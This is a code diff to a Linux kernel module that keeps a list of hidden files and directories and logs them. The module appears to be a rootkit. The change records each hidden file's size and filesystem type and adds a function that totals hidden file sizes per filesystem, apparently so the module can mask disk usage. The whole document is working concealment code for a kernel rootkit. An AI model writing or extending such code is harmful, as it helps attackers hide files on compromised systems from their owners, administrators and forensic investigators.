@@ -14,6 +14,7 @@
 #include <linux/tcp.h>
 #include <linux/pid_namespace.h>
 #include <linux/namei.h>
+#include <linux/fs.h>
 #include "fs.h"
 #include "lkm.h"
 #include "log.h"
@@ -70,6 +71,22 @@ bool fs_file_stat(struct path *path, struct kstat *stat)
 	return true;
 }
 
+static struct inode *_inode_st_get(struct file *f)
+{
+	struct inode *inode;
+	if (!f) {
+		prerr("Error: Invalid argument\n");
+		return NULL;
+	}
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0)
+	inode = f->f_dentry->d_inode;
+#else
+	inode = f->f_inode;
+#endif
+	return inode;
+}
+
+// Caller must free fnode when it's done
 struct fs_file_node *fs_load_fnode(struct file *f)
 {
 	struct inode *i;
@@ -84,8 +101,8 @@ struct fs_file_node *fs_load_fnode(struct file *f)
 	struct mnt_idmap *idmap;
 #endif
 
-	if (!f) {
-		prerr("Error: Invalid argument\n");
+	i = _inode_st_get(f);
+	if (!i) {
 		return NULL;
 	}
 
@@ -134,7 +151,7 @@ struct fs_file_node *fs_load_fnode(struct file *f)
 	return fnode;
 }
 
-struct fs_file_node *fs_get_file_node(const struct task_struct *task)
+struct file *fs_get_file_from_task(const struct task_struct *task)
 {
 	struct file *f;
 
@@ -152,6 +169,15 @@ struct fs_file_node *fs_get_file_node(const struct task_struct *task)
 	if (!f)
 		return NULL;
 
+	return f;
+}
+
+struct fs_file_node *fs_get_file_node(const struct task_struct *task)
+{
+	struct file *f = fs_get_file_from_task(task);
+	if (!f)
+		return NULL;
+
 	return fs_load_fnode(f);
 }
 
@@ -159,10 +185,12 @@ static LIST_HEAD(names_node);
 struct hidden_names {
 	u64 ino;
 	u64 ino_parent;
-	char *name;
+	loff_t size;
 	struct list_head list;
 	bool ro;
 	bool is_dir;
+	char *name;
+	long f_type;
 };
 
 bool fs_search_name(const char *name, u64 ino)
@@ -208,25 +236,41 @@ const char *fs_get_basename(const char *path)
 	return base + 1;
 }
 
+loff_t fs_total_size_by_type(long f_type)
+{
+	struct hidden_names *node, *node_safe;
+	loff_t rv = 0;
+	list_for_each_entry_safe (node, node_safe, &names_node, list) {
+		if (node->f_type == f_type) {
+			rv += node->size;
+		}
+	}
+
+	return rv;
+}
+
 void fs_list_names(void)
 {
 	struct hidden_names *node, *node_safe;
 	list_for_each_entry_safe (node, node_safe, &names_node, list) {
 		if (node->is_dir) {
-			prinfo("hidden: '%s' [directory] ino=%llu ino_parent=%llu\n",
-			       node->name, node->ino, node->ino_parent);
+			prinfo("hidden: '%s' [directory] ino=%llu size=%lld ino_parent=%llu\n",
+			       node->name, node->ino, node->size,
+			       node->ino_parent);
 		} else {
-			prinfo("hidden: '%s' ino=%llu\n", node->name,
-			       node->ino);
+			prinfo("hidden: '%s' ino=%llu size=%lld\n", node->name,
+			       node->ino, node->size);
 		}
 	}
 }
 
-static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent,
-			bool is_dir)
+static int _fs_add_name(const char *name, struct kstat *stat, struct path *path,
+			long f_type, bool ro, u64 ino_parent, bool is_dir)
 {
 	size_t len;
-
+#ifdef DEBUG_RING_BUFFER
+	struct super_block *sb = NULL;
+#endif
 	if (!name)
 		goto err;
 
@@ -234,7 +278,7 @@ static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent,
 	if (!len)
 		goto err;
 
-	if (!fs_search_name(name, ino)) {
+	if (!fs_search_name(name, stat ? stat->ino : 0)) {
 		struct hidden_names *hn =
 			kcalloc(1, sizeof(struct hidden_names), GFP_KERNEL);
 		if (!hn)
@@ -245,12 +289,23 @@ static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent,
 			kfree(hn);
 			return -ENOMEM;
 		}
+
+#ifdef DEBUG_RING_BUFFER
+		if (path)
+			sb = fs_super_block_get(path);
+#endif
+
 		strncpy(hn->name, (const char *)name, len);
 		hn->ro = ro;
-		hn->ino = ino;
+
+		hn->ino = stat ? stat->ino : 0;
+		hn->size = stat ? stat->size : 0;
+		hn->f_type = f_type;
 		hn->is_dir = is_dir;
 		hn->ino_parent = ino_parent;
-		prinfo("hide: '%s'\n", hn->name);
+		prinfo("hide: '%s' ino=%llu size=%llu from superblock '%s'\n",
+		       hn->name, stat ? stat->ino : 0, stat ? stat->size : 0,
+		       sb ? sb->s_id : "untracked");
 		list_add_tail(&hn->list, &names_node);
 	}
 	return 0;
@@ -259,19 +314,21 @@ err:
 	return -EINVAL;
 }
 
-int fs_add_name_ro(const char *name, u64 ino)
+int fs_add_name_ro(const char *name, struct kstat *stat, struct path *path)
 {
-	return _fs_add_name(name, true, ino, 0, false);
+	return _fs_add_name(name, stat, path, 0, true, 0, false);
 }
 
-int fs_add_name_rw(const char *name, u64 ino)
+int fs_add_name_rw(const char *name, struct kstat *stat, struct path *path,
+		   long f_type)
 {
-	return _fs_add_name(name, false, ino, 0, false);
+	return _fs_add_name(name, stat, path, f_type, false, 0, false);
 }
 
-int fs_add_name_rw_dir(const char *name, u64 ino, u64 ino_parent, bool is_dir)
+int fs_add_name_rw_dir(const char *name, struct kstat *stat, struct path *path,
+		       u64 ino_parent, bool is_dir)
 {
-	return _fs_add_name(name, false, ino, ino_parent, is_dir);
+	return _fs_add_name(name, stat, path, 0, false, ino_parent, is_dir);
 }
 
 int fs_del_name(const char *name)
@@ -296,6 +353,16 @@ int fs_del_name(const char *name)
 	}
 
 	return (deleted ? 0 : -EINVAL);
+}
+
+struct super_block *fs_super_block_get(struct path *path)
+{
+	struct inode *inode = d_inode(path->dentry);
+	if (inode) {
+		return inode->i_sb;
+	}
+
+	return NULL;
 }
 
 void fs_names_cleanup(void)
